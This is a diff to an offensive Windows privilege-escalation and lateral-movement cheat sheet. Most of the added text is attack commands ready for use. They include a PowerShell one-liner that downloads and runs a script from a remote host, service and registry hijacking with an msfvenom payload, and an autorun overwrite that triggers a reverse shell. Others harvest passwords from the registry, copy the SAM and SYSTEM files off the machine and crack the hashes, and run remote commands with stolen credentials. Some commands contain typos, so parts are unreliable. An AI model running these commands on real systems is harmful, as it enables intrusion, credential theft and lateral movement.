@@ -258,7 +258,7 @@ Most Windows systems they are running McAfee as their endpoint protection. The p
 `%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml`
 
 
-## Unattended passwords
+### Unattended passwords
 
 
 Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator. This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually. If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system. This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!
@@ -273,7 +273,7 @@ While it’s a good idea to search the entire drive, Unattend files are likely t
 
 `If you find one open it and search for tag. Stored as plaintext or base64.`
 
-## Kernel Exploits
+### Kernel Exploits
 
 WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors
 
@@ -287,7 +287,7 @@ Download and run Sherlock:
 `echo IEX(New-Object Net.WebClient).DownloadString('http://:/Sherlock.ps1') | powershell -noprofile -`
 
 
-## Applications and Drivers Exploits
+### Applications and Drivers Exploits
 
 wmic product get name, version, vendor > install_apps.txt
 
@@ -297,10 +297,276 @@ Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, M
 
 driverquery /v > drivers.txt
 
-## Insecure File or Folder Permissions
+### Insecure File or Folder Permissions
+
+Always use https://download.sysinternals.com/files/AccessChk.zip to check the permissions.
+
+Search for world writable files and directories:
+
+`accesschk.exe -uws "Everyone" "C:\Progrma Files"`
+
+`powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
+
+Find running proccess:
+
+`tasklist /SVC > tasks.txt`
+
+`powershell: Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}`
+
+### Unquoted Service Path
+
+Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:
+
+`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
+
+The next step is to try to identify the level of privilege that this service is running. This can be identified easily:
+
+`sc qc "<service name>"`
+
+### Always Install Elevated
+
+If they return output then vulnerability exists:
+
+`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
+`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+
+### Insecure Service Permissions
+
+Detect is to find a service with weak permissions
+
+`accesschk.exe -uwcqv *`
+
+For Shorten output
+
+`accesschk.exe -uwcqv "Authenticated Users" *`
+`accesschk.exe -uwcqv "Everyone" *`
+
+The output will be the service name, the group name and the permissions that group has. Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. In fact any of the following permissions are worth looking out for:
+
+`SERVICE_CHANGE_CONFIG`
+`SERVICE_ALL_ACCESS`
+`GENERIC_WRITE`
+`GENERIC_ALL`
+`WRITE_DAC`
+`WRITE_OWNER`
+
+If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:
+
+`sc config SERVICENAME binPath= "E:\Service.exe"`
+`sc config SERVICENAME obj=".\LocalSystem" password=""`
+`net stop SERVICENAME`
+`net start SERVICENAME`
+
+Stop and start the service again and you’re a Local Admin!
+
+### Insecure Registry Permissions
+
+Windows stores all the necessary data that is related to services in the registry key location below:
+
+`reg query HKLM\SYSTEM\CurrentControlSet\Services`
+ 
+If you find a vulnerable service use the follwing command to see its details:
+
+`req query HKLM\SYSTEM\CurrentControlSet\Services\<servicename>`
+
+Find from which group is accessible this service
+
+`accesschk.exe /accepteula -uvwqk hklm\System\CurrentControleSet\Service\<servicename>`
+
+Found if note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users).
+
+generate a payload:
+
+`msfvenom –p windows/exec CMD=<Command> -f exe-services –o <service binary>`
+
+Open a listener
+
+Overweight the imagepath subkey of the valuable services with the path of the custom binary
+
+`reg add HKLM\System\CurrentControleSet\Service<Service nam> /v ImagePath /t REG_EXPAND_SZ /d <path_to_exe> /f`
+
+start service:
+
+`net start`
+
+### Token Manipulation
+
+whoami /priv
+
+- SeDebugPrivilege
+- SeRestorePrivilege
+- SeBackupPrivilege
+- SeTakeOwnershipPrivilege
+- SeTcbPrivilege
+- SeCreateToken Privilege
+- SeLoadDriver Privilege
+- SeImpersonate & SeAssignPrimaryToken Priv.
+
+### Potatoes
+
+#### Hot Potatoe
+
+Takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.
+
+Affected systems: `Windows 7,8,10, Server 2008, Server 2012`
+Guide: https://foxglovesecurity.com/2016/01/16/hot-potato/
+Usage: https://github.com/foxglovesec/Potato
+
+#### Rotten Potatoe
+
+Rotten Potato and its standalone variants leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges
+
+Affected systems: `Windows 7,8,10, Server 2008, Server 2012, Server 2016`
+Guide: 
+- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+- https://0xdf.gitlab.io/2018/08/04/htb-silo.html
+
+Usage: https://github.com/nickvourd/lonelypotato
+
+`Rotten Potato from default opens meterpreter, use lonely potato which opens in line shell`
+
+#### Juicy Potato
+
+What is: Juicy potato is basically a weaponized version of the RottenPotato exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation.
+
+Affetcted Systems:
+- Windows 7 Enterprise
+- Windows 8.1 Enterprise
+- Windows 10 Enterprise
+- Windows 10 Professional
+- Windows Server 2008 R2 Enterprise
+- Windows Server 2012 Datacenter
+- Windows Server 2016 Standard
+
+Find CLSID here: https://ohpe.it/juicy-potato/CLSID/
+
+`Warning: Juicy Potato doesn’t work in Windows Server 2019`
+
+Guides:
+
+https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges
+
+https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.
+
+Usage: https://github.com/ohpe/juicy-potato
+
+### Autologon User Credentials
+
+Use the following command and if return output take autologon user credentials from regisrty:
+
+`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"`
+
+### Autoruns
+
+Find auto run executables:
+
+`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+
+Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
+
+`accesschk.exe /accepteula -wvu "\<path>\<file.exe>"`
+
+copy a shell to auto run executable:
+
+`copy <path>\<file.exe> "\<path>\<file.exe>" /Y`
+
+Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it.
+
+`rdesktop <ip>`
+
+### Passwords Registry
+
+The registry can be searched for keys and values that contain the word "password":
+
+`reg query HKLM /f password /t REG_SZ /s`
+
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+
+`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
+
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+
+`winexe -U 'admin%password' //ip_of_victim cmd.exe`
+
+### Security Account Manager Passwords
 
 
 
+Transfer the SAM and SYSTEM files to your Kali VM:
+
+`copy C:\Windows\Repair\SAM \ip\kali\`
+`copy C:\Windows\Repair\SYSTEM \ip\kali\`
+
+On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
+
+`git clone https://github.com/Neohapsis/creddump7.git`
+`sudo apt install python-crypto`
+`python2 creddump7/pwdump.py SYSTEM SAM`
+
+Crack the admin NTLM hash using hashcat:
+
+`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
+
+## Lateral movement
+
+### Powershell Remoting
+
+```
+#Enable Powershell Remoting on current Machine (Needs Admin Access)
+Enable-PSRemoting
+
+#Entering or Starting a new PSSession (Needs Admin Access)
+$sess = New-PSSession -ComputerName <Name>
+Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
+```
+
+### Remote Code Execution with PS Credentials
+
+```
+$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
+Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
+```
+
+### Import a powershell module and execute its functions remotely
+
+```
+#Execute the command and start a session
+Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 
+
+#Interact with the session
+Enter-PSSession -Session $sess
+```
+
+### Executing Remote Stateful commands
+
+```
+#Create a new session
+$sess = New-PSSession -ComputerName <NameOfComputer>
+
+#Execute command on the session
+Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
+
+#Check the result of the command to confirm we have an interactive session
+Invoke-Command -Session $sess -ScriptBlock {$ps}
+```
+
+
+### Tools
+
+
+[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
+[BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
+[Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
+[FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges
+
+
+# Credits
+
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#readme
+
+https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet
 
 
 
